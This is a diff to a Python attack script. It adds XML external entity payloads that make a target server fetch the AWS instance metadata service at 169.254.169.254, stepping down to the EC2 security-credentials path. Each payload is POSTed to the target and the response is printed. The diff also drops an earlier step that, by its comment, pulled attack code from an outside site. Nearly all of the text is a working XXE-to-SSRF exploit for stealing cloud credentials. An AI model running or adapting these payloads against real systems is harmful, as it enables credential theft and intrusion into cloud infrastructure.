@@ -108,6 +108,26 @@ xmlSSRF2 = b"""<?xml version="1.0" encoding="UTF-8"?>
 <product><productId>&id;</productId></product>
 """
 
+xmlSSRF3 = b"""<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY id SYSTEM "http://169.254.169.254/latest/meta-data/identity-credentials/"> ]>
+<product><productId>&id;</productId></product>
+"""
+
+xmlSSRF4 = b"""<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY id SYSTEM "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/"> ]>
+<product><productId>&id;</productId></product>
+"""
+
+xmlSSRF5 = b"""<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY id SYSTEM "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/"> ]>
+<product><productId>&id;</productId></product>
+"""
+
+xmlSSRF6 = b"""<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY id SYSTEM "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"> ]>
+<product><productId>&id;</productId></product>
+"""
+
 header['Content-Type'] = 'application/xml' # required header for sending XML
 
 # try to just run a command; fails
@@ -128,8 +148,17 @@ ic(attempt.content)
 
 sleep(5)
 
-# pull attack code from pastaarmy.com
-attempt = requests.post(URLs[0] + forcedPaths[0], headers=header, data=xmlSSRF2)
+# pull metadata
+attempt = requests.post(URLs[0] + forcedPaths[0], headers=header, data=xmlSSRF3)
+ic(attempt.content)
+sleep(5)
+attempt = requests.post(URLs[0] + forcedPaths[0], headers=header, data=xmlSSRF4)
+ic(attempt.content)
+sleep(5)
+attempt = requests.post(URLs[0] + forcedPaths[0], headers=header, data=xmlSSRF5)
+ic(attempt.content)
+sleep(5)
+attempt = requests.post(URLs[0] + forcedPaths[0], headers=header, data=xmlSSRF6)
 ic(attempt.content)
 
 sleep(60)
